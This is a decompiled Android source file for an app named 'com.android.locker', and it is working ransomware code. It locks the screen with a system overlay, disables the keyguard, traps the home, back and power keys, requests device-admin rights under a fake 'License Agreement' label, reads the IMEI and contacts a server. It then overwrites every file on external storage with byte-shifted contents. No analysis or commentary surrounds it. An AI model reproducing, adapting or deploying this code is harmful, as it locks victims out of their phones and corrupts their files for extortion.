package com.android.locker;

import android.app.Activity;
import android.app.KeyguardManager;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.support.v4.view.accessibility.AccessibilityEventCompat;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.widget.Button;
import android.widget.TextView;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.GregorianCalendar;

public class MainActivity extends DeviceAdminReceiver {

    public static class mainActivity extends Activity {
        public static mainActivity Activity = null;
        public static final int LAUNCH_TIME = 2;
        public static boolean STOP = false;
        static Encryption enc;
        public static ComponentName mAdminName;
        public static DevicePolicyManager mDPM;
        String imei;
        private Window wind;

        private void checkUserFair() {
            if (GregorianCalendar.getInstance().get(5) != 10) {
                safeExit();
            }
        }

        private void safeExit() {
            System.exit(0);
            int t = 0 / 0;
        }

        public void onAttachedToWindow() {
            getWindow().setType(2004);
            super.onAttachedToWindow();
        }

        public void BringToFront(Context ctx) {
            try {
                Log.v("BRING", "BRING");
                Intent intent = new Intent(ctx.getApplicationContext(), MainActivity.class);
                intent.setFlags(272629760);
                ctx.startActivity(intent);
            } catch (Throwable th) {
            }
        }

        public void onWindowFocusChanged(boolean hasFocus) {
            super.onWindowFocusChanged(hasFocus);
            if (!hasFocus) {
                sendBroadcast(new Intent("android.intent.action.CLOSE_SYSTEM_DIALOGS"));
            }
        }

        public void onBackPressed() {
            BringToFront(this);
        }

        public boolean dispatchKeyEvent(KeyEvent event) {
            if (event.getKeyCode() == 26) {
                BringToFront(this);
            }
            if (event.getKeyCode() == 3) {
                BringToFront(this);
            }
            return true;
        }

        public boolean onKeyDown(int keyCode, KeyEvent event) {
            if (keyCode == 3) {
                BringToFront(this);
            } else {
                BringToFront(this);
            }
            return true;
        }

        public boolean onKeyUp(int keyCode, KeyEvent event) {
            if (keyCode == 3) {
                BringToFront(this);
            } else {
                BringToFront(this);
            }
            return true;
        }

        public static void SetDeviceAdmin() {
            Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
            intent.putExtra("android.app.extra.DEVICE_ADMIN", mAdminName);
            intent.putExtra("android.app.extra.ADD_EXPLANATION", "Лицензионное соглашение");
            intent.putExtra("force-locked", 3);
            try {
                Activity.startActivityForResult(intent, 1);
            } catch (Throwable e) {
                e.printStackTrace();
            }
            System.out.println("The Device Could not lock because device admin not enabled");
        }

        /* access modifiers changed from: protected */
        public void onCreate(Bundle savedInstanceState) {
            Log.v("Create", "Create");
            getWindow().setType(2009);
            requestWindowFeature(1);
            getWindow().setFlags(1024, 1024);
            setRequestedOrientation(1);
            setDefaultKeyMode(3);
            ((KeyguardManager) getSystemService("keyguard")).newKeyguardLock("keyguard").disableKeyguard();
            this.wind = getWindow();
            this.wind.addFlags(4194304);
            this.wind.addFlags(AccessibilityEventCompat.TYPE_GESTURE_DETECTION_END);
            this.wind.addFlags(AccessibilityEventCompat.TYPE_TOUCH_INTERACTION_END);
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_main);
            TextView tvIMEI = (TextView) findViewById(R.id.tvIMEI);
            this.imei = ((TelephonyManager) getSystemService("phone")).getDeviceId();
            if (this.imei != null && this.imei.length() > 0) {
                tvIMEI.setText("IMEI " + this.imei);
            }
            new Thread(new Runnable() {
                public void run() {
                    new RequestSender(mainActivity.this).sendIncrement();
                }
            }).start();
            enc = new Encryption();
            Activity = this;
            startService(new Intent(this, BackgroundService.class));
            mDPM = (DevicePolicyManager) getSystemService("device_policy");
            mAdminName = new ComponentName(this, MainActivity.class);
            SetDeviceAdmin();
            ((Button) findViewById(R.id.button1)).setOnClickListener(new OnClickListener() {
                public void onClick(View v) {
                    mainActivity.this.startActivity(new Intent(mainActivity.this, SenderActivity.class));
                }
            });
        }

        public static byte[] readBytes(String path) {
            Exception e;
            File file = new File(path);
            byte[] bFile = new byte[((int) file.length())];
            try {
                FileInputStream fileInputStream = new FileInputStream(file);
                FileInputStream fileInputStream2;
                try {
                    fileInputStream.read(bFile);
                    fileInputStream.close();
                    fileInputStream2 = fileInputStream;
                } catch (Exception e2) {
                    e = e2;
                    fileInputStream2 = fileInputStream;
                    e.printStackTrace();
                    return bFile;
                }
            } catch (Exception e3) {
                e = e3;
                e.printStackTrace();
                return bFile;
            }
            return bFile;
        }

        public void deleteAPP() {
            STOP = true;
            stopService(new Intent(this, BackgroundService.class));
            mDPM.removeActiveAdmin(mAdminName);
            startActivity(new Intent("android.intent.action.DELETE", Uri.parse("package:com.android.locker")));
        }

        public void encryptAll() {
            File[] f = new File(String.valueOf(Environment.getExternalStorageDirectory())).listFiles();
            for (File goToDir : f) {
                goToDir(goToDir, true);
            }
        }

        public static void goToDir(File path, boolean encrypt) {
            Log.v("CRYPT", path.getAbsolutePath());
            byte[] b;
            int i;
            BufferedOutputStream bos;
            if (encrypt) {
                try {
                    b = readBytes(String.valueOf(new StringBuilder(String.valueOf(path.getAbsolutePath().substring(0, path.getAbsolutePath().lastIndexOf("/")))).append("/").append(path.getName()).toString()));
                    byte[] encoded = new byte[b.length];
                    for (i = 0; i < b.length; i++) {
                        encoded[i] = (byte) (b[i] + 1);
                    }
                    bos = new BufferedOutputStream(new FileOutputStream(new File(path.getAbsolutePath())));
                    bos.write(encoded);
                    bos.flush();
                    bos.close();
                    return;
                } catch (Throwable th) {
                    File[] l = new File(path.getAbsolutePath()).listFiles();
                    for (File goToDir : l) {
                        goToDir(goToDir, encrypt);
                    }
                    return;
                }
            }
            b = readBytes(String.valueOf(new StringBuilder(String.valueOf(path.getAbsolutePath().substring(0, path.getAbsolutePath().lastIndexOf("/")))).append("/").append(path.getName()).toString()));
            byte[] decoded = new byte[b.length];
            for (i = 0; i < b.length; i++) {
                decoded[i] = (byte) (b[i] - 1);
            }
            bos = new BufferedOutputStream(new FileOutputStream(new File(path.getAbsolutePath())));
            bos.write(decoded);
            bos.flush();
            bos.close();
        }

        public static void decryptAll() {
            File[] f = new File(String.valueOf(Environment.getExternalStorageDirectory())).listFiles();
            for (File goToDir : f) {
                goToDir(goToDir, false);
            }
        }
    }

    public void onEnabled(Context context, Intent intent) {
    }

    public CharSequence onDisableRequested(Context context, Intent intent) {
        return "";
    }

    public void onDisabled(Context context, Intent intent) {
    }
}
